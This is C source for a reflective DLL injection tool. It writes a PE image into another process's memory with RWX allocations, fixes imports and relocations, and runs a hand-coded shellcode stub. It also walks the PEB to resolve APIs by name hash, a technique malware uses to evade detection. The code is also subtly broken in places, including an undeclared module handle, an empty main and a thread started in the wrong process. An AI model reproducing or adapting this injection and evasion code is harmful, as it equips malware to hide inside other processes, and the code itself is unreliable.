#include "Reflective.h"

void Failed(LPCSTR Message);

int main()
{

}

HMODULE Reflective(HANDLE hProcess, BYTE *MemoryStream)
{
    /*printf("[+] File Name : %s\n", DllName);

    HANDLE hFile = CreateFileA(DllName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD Size = GetFileSize(hFile, NULL);
    printf("[*] File Size : %d Byte\n", Size);

    BYTE* Buffer = malloc(Size);
    ReadFile(hFile, Buffer, Size, &Size, NULL);
    printf("[+] File Opening!\n");*/

    SIZE_T NumberOfBytesWritten;
    WINBOOL bSuccess;

    ULONGLONG RowImageBase = MemoryStream;
    IMAGE_DOS_HEADER *DOS = MemoryStream;

    if (DOS->e_magic != MZ)
    {
        printf("[-] This memory stream is not executable file!\n");
        return NULL;
    }

    IMAGE_NT_HEADERS64 *NT = RowImageBase + DOS->e_lfanew;

    if (NT->Signature != PE)
    {
        printf("[-] This memory stream is not PE format\n");
        return NULL;
    }

    ULONGLONG ImageBase;
    ULONGLONG OriginImageBase = NT->OptionalHeader.ImageBase;

    if (!(ImageBase = VirtualAllocEx(hProcess, NT->OptionalHeader.ImageBase, NT->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
    {
        ImageBase = VirtualAllocEx(hProcess, NULL, NT->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (ImageBase == NULL)
    {
        Failed("VirtualAlloc failed!!");
        return NULL;
    }
    printf("[*] ImageBase : 0x%p\n", ImageBase);

    // memcpy(ImageBase, DOS, NT->OptionalHeader.SizeOfHeaders);
    bSuccess = WriteProcessMemory(hProcess, ImageBase, DOS, NT->OptionalHeader.SizeOfHeaders, &NumberOfBytesWritten);
    if (!bSuccess)
    {
        Failed("DOS header write failed!");
        VirtualFreeEx(hProcess, ImageBase, 0, MEM_RELEASE);
        return NULL;
    }

    printf("[+] PE headers writing by %d Byte\n", NumberOfBytesWritten);

    IMAGE_SECTION_HEADER (*SECTION)[1] = (ULONGLONG)NT + sizeof(IMAGE_NT_HEADERS64);
    printf("[*] First section : 0x%p\n", SECTION);

    for (int i = 0; i < NT->FileHeader.NumberOfSections; i++)
    {
        printf("[+] Section name : %s\n", SECTION[i]->Name);
        bSuccess = WriteProcessMemory(hProcess, ImageBase + SECTION[i]->VirtualAddress, RowImageBase + SECTION[i]->PointerToRawData, SECTION[i]->SizeOfRawData, &NumberOfBytesWritten);
        if (!bSuccess)
        {
            Failed("Section write failed!");
            VirtualFreeEx(hProcess, ImageBase, 0, MEM_RELEASE);
            return NULL;
        }
        printf("[+] Section mapping OK..!\n");
    }

    IMAGE_IMPORT_DESCRIPTOR (*IMPORT)[1] = ImageBase + NT->OptionalHeader.DataDirectory[1].VirtualAddress;
    printf("[*] IAT Recovery\n");

    PVOID SharedMemoryAddress = VirtualAllocEx(hProcess, NULL, 0, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (SharedMemoryAddress == NULL)
    {
        Failed("Shared memory allocate failed!");
        VirtualFreeEx(hProcess, ImageBase, 0, MEM_RELEASE);
        return NULL;
    }

    HMODULE (__stdcall *pGetModuleHandleA)(LPCSTR);

    for (int i = 0;; i++)
    {
        if (IMPORT[i]->OriginalFirstThunk == NULL)
            break;

        PSTR LibName = ImageBase + IMPORT[i]->Name;
        printf("[+] Library name : %s\n", LibName);

        bSuccess = WriteProcessMemory(hProcess, SharedMemoryAddress, LibName, strlen(LibName) + 1, NULL);
        if (!bSuccess)
        {
            Failed("Write library name failed!");
            VirtualFreeEx(hProcess, ImageBase, 0, MEM_RELEASE);
            return NULL;
        }

        HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, GetModuleHandleA, SharedMemoryAddress, NULL, NULL);

        // HMODULE hModule;
        // if (!(hModule = GetModuleHandleA(LibName)))
        // {
        //     hModule = LoadLibraryA(LibName);
        // }

        for (int j = 0;; j++)
        {
            IMAGE_THUNK_DATA64 *THUNK = ImageBase + IMPORT[i]->OriginalFirstThunk + j * 8;

            if (THUNK->u1.AddressOfData == NULL)
                break;

            if (THUNK->u1.Ordinal > 0x80000000)
                *(ULONGLONG *)(ImageBase + IMPORT[i]->FirstThunk + j * 8) = GetProcAddress(hModule, MAKEINTRESOURCEA(THUNK->u1.Ordinal));
            else
            {
                IMAGE_IMPORT_BY_NAME *IMPORT_NAME = ImageBase + THUNK->u1.AddressOfData;
                printf("[+] Function name : %s\n", IMPORT_NAME->Name);
                *(ULONGLONG *)(ImageBase + IMPORT[i]->FirstThunk + j * 8) = GetProcAddress(hModule, IMPORT_NAME->Name);
            }
        }
    }

    if (ImageBase != NT->OptionalHeader.ImageBase)
    {
        IMAGE_BASE_RELOCATION *BASE_RELOCATION = NULL;
        for (int i = 0; i < NT->FileHeader.NumberOfSections; i++)
        {
            if (NT->OptionalHeader.DataDirectory[5].VirtualAddress == SECTION[i]->VirtualAddress)
            {
                BASE_RELOCATION = RowImageBase + SECTION[i]->PointerToRawData;
                break;
            }
        }

        DWORD SIZE_RELOCATION = NT->OptionalHeader.DataDirectory[5].Size;

        if (BASE_RELOCATION == NULL | SIZE_RELOCATION == 0)
        {
            Failed("This DLL is not supported Relocation!");
            VirtualFree(ImageBase, MEM_RELEASE, 0);
            return NULL;
        }

        DWORD SIZE = 0;

        while (SIZE != SIZE_RELOCATION)
        {
            BASE_RELOCATION_ENTRY (*Type)[1] = (ULONGLONG)BASE_RELOCATION + 8;
            for (int i = 0; i < (BASE_RELOCATION->SizeOfBlock - 8) / 2; i++)
            {
                if ((*Type[i]).Offset != NULL)
                {
                    ULONGLONG *HardCodingAddress = ImageBase + BASE_RELOCATION->VirtualAddress + (*Type[i]).Offset;
                    ULONGLONG HardCodingData;

                    if (ReadProcessMemory(hProcess, HardCodingAddress, &HardCodingData, 8, NULL) == FALSE)
                    {
                        Failed("Reloc read failed!");
                        VirtualFreeEx(hProcess, ImageBase, 0, MEM_RELEASE);
                        return NULL;
                    }

                    printf("[+] 0x%p : 0x%p -> ", HardCodingAddress, HardCodingData);

                    HardCodingData -= (ULONGLONG)OriginImageBase;
                    HardCodingData += (ULONGLONG)ImageBase;

                    printf("0x%p\n", HardCodingData);

                    if (WriteProcessMemory(hProcess, HardCodingAddress, &HardCodingData, 8, NULL) == FALSE)
                    {
                        Failed("Reloc write failed!");
                        VirtualFreeEx(hProcess, ImageBase, 0, MEM_RELEASE);
                        return NULL;
                    }
                }
            }

            SIZE += BASE_RELOCATION->SizeOfBlock;
            BASE_RELOCATION = (ULONGLONG)BASE_RELOCATION + BASE_RELOCATION->SizeOfBlock;
        }
    }

    PVOID EntryPoint = ImageBase + NT->OptionalHeader.AddressOfEntryPoint;

    printf("[*] EntryPoint : 0x%p\n", EntryPoint);

    printf("[*] Create New Thread!\n");

    BYTE CallDllMainShellCode[] = { 0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xC8, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00, 0x49, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x48, 0x01, 0xC8, 0xFF, 0xD0, 0xC9, 0xC3 };

    PVOID CallDllMain = VirtualAllocEx(hProcess, NULL, sizeof(CallDllMainShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (CallDllMain == NULL)
    {
        Failed("Failed allocate shellcode space!");
        VirtualFreeEx(hProcess, ImageBase, 0, MEM_RELEASE);
        return NULL;
    }

    *(ULONGLONG *)(CallDllMainShellCode + 13) = ImageBase;

    if (WriteProcessMemory(hProcess, CallDllMain, CallDllMainShellCode, sizeof(CallDllMainShellCode), NULL) == FALSE)
    {
        Failed("CallDllMain ShellCode write failed!");
        VirtualFreeEx(hProcess, ImageBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, CallDllMain, 0, MEM_RELEASE);
        return NULL;
    }

    DWORD TID;
    HANDLE hThread = CreateThread(NULL, 0, CallDllMain, NT->OptionalHeader.AddressOfEntryPoint, 0, &TID); //= CreateThread2(NULL, NULL, EntryPoint, CREATE_SUSPENDED, &TID, 3, ImageBase, DLL_PROCESS_ATTACH, NULL);

    if (hThread == NULL)
    {
        Failed("Failed create thread!");
        VirtualFreeEx(hProcess, ImageBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, CallDllMain, 0, MEM_RELEASE);
        return NULL;
    }

    printf("[+] Thread handle : 0x%x\n", hThread);
    printf("[+] ThreadId : %d\n", TID);

    WaitForSingleObject(hThread, INFINITE);

    DWORD ExitCode;

    GetExitCodeThread(hThread, &ExitCode);

    if (ExitCode)
        printf("[+] Reflective DLL Injection success!!\n");
    else
    {
        printf("[+] DllMain return value is FALSE!\n");
        Failed("Reflective DLL Injection failed");
        VirtualFreeEx(hProcess, ImageBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, CallDllMain, 0, MEM_RELEASE);
        return NULL;
    }

    return (HMODULE)ImageBase;
}

void Failed(LPCSTR Message)
{
    printf("[-] %s\n", Message);
    DWORD ErrorCode = GetLastError();
    printf("[+] GetLastError : %d\n", ErrorCode);
    LPSTR ErrorMessage;
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER, NULL, ErrorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), &ErrorMessage, 0, NULL);
    printf("[+] ErrorMessage : %s\n", ErrorMessage);
}

// This function is code injected(Code Injection) like shellcode
void *SearchFunction(ULONGLONG Key)
{
    PEB *peb;
    // Get PEB Address
    __asm__ __volatile__ (
        "mov rax, gs:[0x60]\n\t"
        "mov %[PEB], rax\n\t"
        : [PEB] "=m" (peb)
    );
    // LDR_DATA_TABLE_ENTRY *LdrDataTableEntry = peb->Ldr->InLoadOrderModuleList.Flink;
    LDR_DATA_TABLE_ENTRY *LdrDataTableEntry = *(ULONG_PTR *)((ULONG_PTR)peb->Ldr + 8 + sizeof(PVOID));
    // PVOID Head = &peb->Ldr->InLoadOrderModuleList;
    PVOID Head = (ULONG_PTR)peb->Ldr + 8 + sizeof(PVOID);
    do
    {
        // ULONG_PTR ImageBase = LdrDataTableEntry->DllBase;
        ULONG_PTR ImageBase = *(ULONG_PTR *)((ULONG_PTR)LdrDataTableEntry + sizeof(PVOID) * 6);
        IMAGE_EXPORT_DIRECTORY *EXPORT = ((IMAGE_NT_HEADERS *)(((IMAGE_DOS_HEADER *)ImageBase)->e_lfanew + ImageBase))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + ImageBase;
        if (EXPORT == ImageBase)
            continue;

        for (int i = 0; i < EXPORT->NumberOfNames; i++)
        {
            DWORD length;
            LPCSTR FunctionName = ImageBase + *(DWORD *)(ImageBase + EXPORT->AddressOfNames + i * 4);
            
            // This macro function is same strlen
            STRLEN(FunctionName, length);

            unsigned long long data = 0;

            for (int i = 0; i < length; i++)
            {
                data += FunctionName[i];
                data = (data << (FunctionName[i] & 0x0F)) ^ data;
            }

            if (data == Key)
            {
                WORD Index = *(WORD *)(ImageBase + EXPORT->AddressOfNameOrdinals + i * 2);
                return ImageBase + *(DWORD *)(ImageBase + EXPORT->AddressOfFunctions + Index * 4);
            }
        }
    } while ((LdrDataTableEntry = *(ULONG_PTR *)LdrDataTableEntry) != Head);

    return NULL;
}
void AtherFunc() {}